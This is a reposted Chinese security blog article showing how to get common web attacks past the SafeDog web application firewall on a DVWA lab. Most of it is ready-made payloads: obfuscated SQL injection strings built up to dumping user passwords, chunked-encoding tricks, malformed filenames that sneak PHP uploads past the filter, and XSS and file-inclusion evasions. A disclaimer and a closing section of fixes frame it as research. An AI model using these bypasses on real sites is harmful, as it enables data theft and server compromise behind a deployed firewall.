> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/uRkudYZGvxJsMwkfW-ywiw)

**前言**
------

本文以最新版安全狗为例，总结一下我个人掌握的一些绕过 WAF 进行常见 WEB 漏洞利用的方法，希望能起到抛砖引玉的效果。如果师傅们有更好的方法，烦请不吝赐教。  

PS：本文仅用于技术研究与讨论，严禁用于任何非法用途，违者后果自负，作者与平台不承担任何责任

### 测试环境

PHPStudy（PHP5.4.45+Apache+MySQL5.5.53）+ 最新版安全狗（4.0.28330）

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR38uojGJ1B7tXbHpiaFjPXGS2YNBFloMnlL4GECKAMM9ZKmHkDPwgk0fKtXxecrBvVCHnl6N6DlkWBA/640?wx_fmt=jpeg)

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR38uojGJ1B7tXbHpiaFjPXGS2eNVicNIH6icLLYJuVODvz4C6VuricKdOmgf9wgDScibJ6DNNwcGupTW7iaA/640?wx_fmt=jpeg)

靶场使用 DVWA：http://www.dvwa.co.uk/

SQL 注入
------

### 判断是否存在注入

#### **方法一**

and 1=1 被拦截

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR38uojGJ1B7tXbHpiaFjPXGS2OzXDSY8vDuQYO71r5bOaCKN3QyaHUWPxe2iaLLSnqCibkU3mjn5CsnKA/640?wx_fmt=jpeg)

单独的 and 是不拦截的。and 后面加数字或者字符的表达式会被匹配拦截。

1=1，1=2 的本质是构造一个真、假值，我们可以直接用 True,False 代替

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR38uojGJ1B7tXbHpiaFjPXGS2mWz8Ilqkx1LEcWUmL1m1lGEAKzcJnHOxGrGTiaOdKr3zicwgCJqx9FmA/640?wx_fmt=jpeg)

但是依然会被拦截。不过 and 也可以用 && 代替。

我们构造 **1’ && True —+** 就可绕过

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR38uojGJ1B7tXbHpiaFjPXGS2giadHBEHibR9NUZx1UUQcysKQnicF2mgWmUPavRXAQx52FIKtYrRWxC8Q/640?wx_fmt=jpeg)

**1’ && False —+**

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR38uojGJ1B7tXbHpiaFjPXGS2VDGc3TSEuicRrEjQUZHwElC1RveribyojzF8eiblAXTLxjN83XYnvplhw/640?wx_fmt=jpeg)

#### **方法二**

将 and 后面的数字或者字符表达式加几个内联注释也可以绕过。

内联注释：/ / 在 mysql 中是多行注释 但是如果里面加了! 那么后面的内容会被执行。这些语句在不兼容的数据库中使用时便不会执行

如：**1’ and /_!1_/=/_!1_/ —+**

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR38uojGJ1B7tXbHpiaFjPXGS2aibolSRCUAVFVFWr1EnsUmwCMTvbXZFvo8eiav2ybTibkkpHIoa01Ez8g/640?wx_fmt=jpeg)

1’ and /_!1_/=/_!2_/ —+

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR38uojGJ1B7tXbHpiaFjPXGS2C11xalVib6CH3zWISeWyodGicVBxF3LqMdhgYXAbeoKmeANJbAHiaHsww/640?wx_fmt=jpeg)

#### **方法三  分块传输**

#### 分块传输的原理请自行检索，这里不再赘述。

分块传输插件：https://github.com/c0ny1/chunked-coding-converter/releases/tag/0.2.1

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR38uojGJ1B7tXbHpiaFjPXGS2S9r60iaNduLay8n20ib0rnF83tgZqD87CMp56YUcw6oL7euic3cgepIMg/640?wx_fmt=jpeg)

正常写测试 payload :    1’ and 1=1 —+

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR38uojGJ1B7tXbHpiaFjPXGS2a3tyNGRnydrROYx1qF2wwOsrM1s5WJZ0KZ5zG61HF115WAMaeqFH7Q/640?wx_fmt=jpeg)

将请求方式改为 POST，然后进行分块传输编码

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR38uojGJ1B7tXbHpiaFjPXGS20brCQmGkYk4rhrqZwau0xYu5S8ibooUspuANibjLrRjvCibHWteRicgE3Q/640?wx_fmt=jpeg)

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR38uojGJ1B7tXbHpiaFjPXGS2mAEHmTFeia8pVaBJlMsr2R6viaV4iaGLziaUq09m0TgzIdyyRkKia54j6ag/640?wx_fmt=jpeg)

可以看到，没有被拦截。

1’ and 1=2 —+

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR38uojGJ1B7tXbHpiaFjPXGS2QbASfpXh51rM6uquQ0POMia7fkEVroicQN8SopvEVopyIhELPyAZia2Fw/640?wx_fmt=jpeg)

### 猜解字段数

#### **方法一**

order by 被拦截

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR38uojGJ1B7tXbHpiaFjPXGS2LIlEQ2nfnLI5QmLkXZn65FStXp8DdM2gJzHkz5AFSrSQoOU8ibu1FKg/640?wx_fmt=jpeg)

单独的 order 和单独的 by 都不会被拦截，我们需要在 order by 之间加各种无效字符。

可以将 1' order /*$xxx$*/ by 1 --+  放 burp 里跑各种垃圾参数字典来爆破。

经过测试，**1’ order/_%%!asd%%%%_/by 3 —+** 可以成功过狗

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR38uojGJ1B7tXbHpiaFjPXGS2jGnqhicqY1ibXvarr2CXJnSWRibndib9xMckhibVCyIRzibgUnFbblQRvicmA/640?wx_fmt=jpeg)

通过内联注释 /_!_/ 和注释 /**/ 以及一些无效字符也可以绕过（需要不断 Fuzz 尝试）

**1’ /_!order/_!/*/**/by_/ 3 —+*_

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR38uojGJ1B7tXbHpiaFjPXGS2jPSANCibstoIGhL2uY7Cn5k7S9QlRRZz9fGwcXuIpHcGiaEvdzRXVqqg/640?wx_fmt=jpeg)

#### **方法二 分块传输**

1’ order by 3 —+

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR38uojGJ1B7tXbHpiaFjPXGS2SIKEwxvibP6IkUyuJPAiavcFGd2jXRNPgoibmFkgS1ib2TYZqcImZgrdTw/640?wx_fmt=jpeg)

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR38uojGJ1B7tXbHpiaFjPXGS2fYV0JS1JgYgYfKyt8SKcaePmy0WF5PAad08fL0E1H9kk5roq0qYm9Q/640?wx_fmt=jpeg)

### 获取当前数据库

#### **方法一**

1’ union select 1,database() —+ 被拦截

分开测试  union select 会被拦截

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR38uojGJ1B7tXbHpiaFjPXGS2iapOxrYQbucQ4O5ibpXZrkAcj4MfMKjw1iaiaZziaX9oQ5qFGBv3dSQpOibQ/640?wx_fmt=jpeg)

database() 也会被拦截

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR38uojGJ1B7tXbHpiaFjPXGS2TYgEJDahI8Xt7uWiaibnbNApawGAe0k9LkjQHzxZ3KF54ibWZV8mUy13A/640?wx_fmt=jpeg)

先绕过 union select：

和之前 order by 的绕过方法一样

**1’ union/_%%!asd%%%%_/select 1,2 —+**

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR38uojGJ1B7tXbHpiaFjPXGS2TNcVzCmnbW4xmPrM6ySZdjYF52BPLxpZEfB9IrQ1BfOYZcldhVeJ3Q/640?wx_fmt=jpeg)

再绕过 database()：

经过测试，我们发现单独的 database 不会被拦截，加了括号就会了

我们将之前的垃圾数据 /_%%!asd%%%%_/ 放到括号了，即可成功绕过

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR38uojGJ1B7tXbHpiaFjPXGS2ut4P8kUwm5rWMsFCwceVVvnDDlRaViaF6tB4M44USXkxoYS0JyC03JA/640?wx_fmt=jpeg)

拼接一下，最终的 payload 为：

**1’ union/_%%!asd%%%%_/select 1,database(/_%%!asd%%%%_/) —+**

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR38uojGJ1B7tXbHpiaFjPXGS2Ptt6Kwhv336RraB1y3XVeYUBJ2ALE0EwibIM7ia1iaT3uCVlUCnHMwzWA/640?wx_fmt=jpeg)

#### **方法二 分块传输**

分块传输依然可以

1’ union select 1,database() —+

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR38uojGJ1B7tXbHpiaFjPXGS2Kjb1AfwRaUzPLicViaia0vIWlADp5qZknu0A966CNY8YRCsPqwwa5NARA/640?wx_fmt=jpeg)

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR38uojGJ1B7tXbHpiaFjPXGS2ISTe25725rqqd4rBRxRrEKdgsicTAN2mDqiclqqFNsyAf82UKQl2Ldpg/640?wx_fmt=jpeg)

### 获取数据库中的表

#### 方法一

正常注入语句：

1’ union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() —+

根据前面的测试，这个绕过就很简单了，只需要将一个空格地方替换成 **/_%%!asd%%%%_/** 即可。

Payload：

**1’ union/_%%!asd%%%%_/select 1,group_concat(table_name) /_%%!asd%%%%_/from /_%%!asd%%%%_/information_schema.tables where table_schema=database(/_%%!asd%%%%_/) —+**

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR38uojGJ1B7tXbHpiaFjPXGS2ZV4ibgPlgxXfIia3HTV2hMuSDkhph1acxY8hlf6KOJEBhruYymMuuXog/640?wx_fmt=jpeg)

#### **方法二 分块传输**

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR38uojGJ1B7tXbHpiaFjPXGS210kAK3yoPKvkh4rHn16khxA9MAhKj8icDA1h7Wl9lChgiaM7Ea8pjzGA/640?wx_fmt=jpeg)

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR38uojGJ1B7tXbHpiaFjPXGS25cx6v5Hry5iaNj7Tz51kJaHPMqfk9LcmcMxRORgJodYzq6Vhy8CMgGQ/640?wx_fmt=jpeg)

### 获取表中的字段名

#### **方法一**

正常注入语句：

1’ union select 1,group_concat(column_name) from information_schema.columns where table_name=’users’ —+

绕过方法和获取表的操作无异:

**1’ union/_%%!asd%%%%_/select 1,group_concat(column_name) /_%%!asd%%%%_/from/_%%!asd%%%%_/information_schema.columns where table_name=’users’ —+**

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR38uojGJ1B7tXbHpiaFjPXGS2vCBpW4hjOmic5bbL9ONzsmibaLVqCCpQLeTkXrPtoSiccGQ94kbFT7HRA/640?wx_fmt=jpeg)

#### **方法二 分块传输**

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR38uojGJ1B7tXbHpiaFjPXGS2pmqt17btguGnNLteuPVAW8LTdxwTMZCGibzksibOnf3NP48WlHfA9Vtw/640?wx_fmt=jpeg)

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR38uojGJ1B7tXbHpiaFjPXGS28XJ8jLe5yxoC78hWCCM53I9OGYzyoZhRhq4gSnMMpToNTJnYgeqUvQ/640?wx_fmt=jpeg)

### 获取数据

#### **方法一**

正常注入语句：

1’ union select group_concat(user),group_concat(password) from users —+

绕过方法还是一样：

**1’ union/_%%!asd%%%%_/select group_concat(user),group_concat(password) /_%%!asd%%%%_/from/_%%!asd%%%%_/users —+**

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR38uojGJ1B7tXbHpiaFjPXGS2IP47P0IkALcYllb7YibUET2wLrStbvnciactmicUiaJ2UlgJ29j88OZvBQ/640?wx_fmt=jpeg)

#### **方法二 分块传输**

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR38uojGJ1B7tXbHpiaFjPXGS2ibM0K1byenwE2vDd7Fafnj2xteKqlT39YNicfYEq3ujBFRicz5ej3KHcg/640?wx_fmt=jpeg)

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR38uojGJ1B7tXbHpiaFjPXGS2nQXrIjKPHoM5CE85vu12buibn455cUqcx6yqfhvEmE8CSrmFhLd3HCw/640?wx_fmt=jpeg)

文件上传
----

安全狗对文件上传的拦截是通过检测文件扩展名来实现的。只要解析结果在禁止上传的文件类型列表中，就会被拦截。

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR38uojGJ1B7tXbHpiaFjPXGS2SPyPW82RkkyvwTXcNrbIuNicM2yvrGFiarib4DRMLibzBJgeRbLUzZT9pw/640?wx_fmt=jpeg)

我们要做的就是构造各种畸形数据包，以混淆 WAF 的检测规则。

获取文件名的地方在 Content-Disposition 和 Content-Type，所以绕过的地方也主要在这两个地方

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR38uojGJ1B7tXbHpiaFjPXGS2gjn0LuMUQibccxW0spsw2H4qQ77h5bZicfUVy8rQkTk25MicjzdzXUD3A/640?wx_fmt=jpeg)

直接上传 PHP 文件会被拦截

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR38uojGJ1B7tXbHpiaFjPXGS2uLrTMqTIedA3aw0uHG777tat12SgssHiblGxuODbnVWTs1SLhQeelNQ/640?wx_fmt=jpeg)

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR38uojGJ1B7tXbHpiaFjPXGS2n0safibPEqDQKVWkf5uKmQlyMOJf2qdeQs2HCTcghunGxW4nEAeQMug/640?wx_fmt=jpeg)

### 绕过方法 1

将 filename=”hhh.php” 改为 **filename=hhh.php;** 即可绕过

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR38uojGJ1B7tXbHpiaFjPXGS2eInHn8JyW79U29SIhaQM0J42xvWvaR6Zssf3DgmP9sVicibHnHYNn2zQ/640?wx_fmt=jpeg)

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR38uojGJ1B7tXbHpiaFjPXGS2ajXzob3GtZhopmEPXMYL6MEbzyibggagew2WkK3C3W3ox9SJAqMOOcQ/640?wx_fmt=jpeg)

### 绕过方法 2

各种换行，主要是要把点号和字符串”php” 分开

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR38uojGJ1B7tXbHpiaFjPXGS2nVPv8eso9ZSHsXI7TSdIKHbaLu2Q5iaViak0Z19icHLduMMku8QPYziaZA/640?wx_fmt=jpeg)

### 绕过方法 3

将 filename=”hhh.php” 改为 **filename==”hhh.php”**(三个等号也可以绕过)

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR38uojGJ1B7tXbHpiaFjPXGS2ibS0B5basPsSRKbD7cKVnratP7OeicOxeeZbMb6L0wB6QmHTeo6ktFUw/640?wx_fmt=jpeg)

### 绕过方法 4

文件名之间放置分号 **filename=”hh;h.php”**

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR38uojGJ1B7tXbHpiaFjPXGS2v7llBbqNaicyxRiatxHgGdWz1mdmpodQpZXE3D3vBcNl7NHMibYoDr5Cg/640?wx_fmt=jpeg)

### 绕过方法 5

多个 filename=”hhh.txt”，最后一个 filename=”hhh.php”

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR38uojGJ1B7tXbHpiaFjPXGS22Z4SjREea9iamHvxvXTCWvn5mfEyV6NCF6c70q3sS6ePIZr0RFica51A/640?wx_fmt=jpeg)

XSS
---

查看安全狗的漏洞防护规则可以发现，安全狗对 XSS 的防护是基于黑名单的，我们只要 fuzz 一下哪些标签没有被过滤就好了。

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR38uojGJ1B7tXbHpiaFjPXGS2Fb1bVpPNoIWxtTXaGNlY5KuT6ySpefCLOhyod5KAXBcH8kE6pUuEqg/640?wx_fmt=jpeg)

有很多标签可以绕过，这里举例两种：

(1) 标签定义声音，比如音乐或其他音频流。

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR38uojGJ1B7tXbHpiaFjPXGS2nobib2OkdpmEsFtbBSexl1GanXlgq7XxJibXM6SbrXu1BAFOUviafJPAQ/640?wx_fmt=jpeg)

(2) 标签, data 属性

alert(‘xss’) 的 base64 编码：PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=

payload:

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR38uojGJ1B7tXbHpiaFjPXGS2LtKDrwvoPTLdofRkNB0iccRmXuZRiaAkQneDXfibRDiaJibS6lcCsEYQOyQ/640?wx_fmt=jpeg)

文件包含
----

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR38uojGJ1B7tXbHpiaFjPXGS2l81oBYlfspwWqiatpbkXns6GCEIHiaXGIRMvibMhDzgs3eM8XPFTcEaLg/640?wx_fmt=jpeg)

通过绝对路径、相对路径，稍微加些混淆就能绕过…

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR38uojGJ1B7tXbHpiaFjPXGS2iag2nMvfQR290iaN3bxWRLUyXR7URFymZGdaxUXon1icn86xx8EjNu4Tw/640?wx_fmt=jpeg)

修复建议
----

我们研究 WAF 绕过的目的主要是为了警醒网站开发者并不是部署了 WAF 就可以高枕无忧了，要明白漏洞产生的根本原因，最好能在**代码层面**上就将其修复。下面给出一些修复建议：

### SQL 注入

> 使用预编译 sql 语句查询和绑定变量：使用 PDO 需要注意不要将变量直接拼接到 PDO 语句中。所有的查询语句都使用数据库提供的参数化查询接口，参数化的语句使用参数而不是将用户输入变量嵌入到 SQL 语句中。当前几乎所有的数据库系统都提供了参数化 SQL 语句执行接口，使用此接口可以非常有效的防止 SQL 注入攻击。
> 
> 对用户输入的数据格式进行严格要求, 比如编号只能输入数字就只能输入数字, 只能输入字母就只能输入字符, 并且对数据的长度进行限制。

### 文件上传

> 文件上传的目录设置为不可执行：只要 Web 容器无法解析该目录下的文件，即使攻击者上传了脚本文件，服务器本身也不会受到影响。在实际的上传应用中，可以将文件上传后放到独立的存储上，做静态文件处理，一方面方便使用缓存加速，降低性能损耗；另一方面也杜绝了脚本执行的可能。
> 
> 使用随机数改写文件名和文件路径
> 
> 上传文件时，服务端采用白名单形式限制文件上传的后缀名称，只允许上传 “jpg、png、gif、bmp 、doc、docx、rar、zip” 等非 Web 脚本执行文件。

### XSS

> 对用户输入的参数中的特殊字符进行 HTML 转义或者编码，防止出现有意义的 HTML、CSS、JavaScript 代码，如：“’、”、<、>、(、=、.” 等特殊字符。可以通过 Filter 过滤器实现全局编码或者转义，也可以在单点对字符串类型数据进行编码或者转义。

作者：Yokan，转载于：FreeBuf

**END**

![](https://mmbiz.qpic.cn/mmbiz_gif/7QRTvkK2qC7IHABFmuMlWQkSSzOMicicfBLfsdIjkOnDvssu6Znx4TTPsH8yZZNZ17hSbD95ww43fs5OFEppRTWg/640?wx_fmt=gif)

●[干货 | 渗透学习资料大集合（书籍、工具、技术文档、视频教程）](http://mp.weixin.qq.com/s?__biz=MzIwMzIyMjYzNA==&mid=2247490892&idx=2&sn=5820f8871f23ffc525a27e1c6ae1ae4c&chksm=96d3e649a1a46f5f88051b88fb05efd4cda4c885a4f47ac63795354cbfe5e3a93de747f3f10a&scene=21#wechat_redirect)

![](https://mmbiz.qpic.cn/mmbiz_png/GzdTGmQpRic1h3TgVSG1Y5yhdcY0zG9O08W40UsLxZyr4efYkkuP6qjyvBMrn61TUyDQVPGiaUsqWsoicrJuc0Pqg/640?wx_fmt=png)

公众号